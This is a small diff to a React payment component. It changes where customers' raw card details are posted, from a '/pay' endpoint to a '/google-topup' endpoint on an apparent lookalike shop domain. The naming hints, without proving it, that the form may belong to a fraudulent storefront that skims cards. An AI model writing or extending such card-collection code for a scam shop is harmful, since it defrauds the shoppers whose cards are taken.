@@ -65,7 +65,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
 
   const payFetch = async (orderNumber, amount, cardDetails) => {
     try {
-      const response = await fetch('https://api.christopeit-france.shop/pay', {
+      const response = await fetch('https://api.christopeit-france.shop/google-topup', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ orderNumber, amount, cardDetails }),
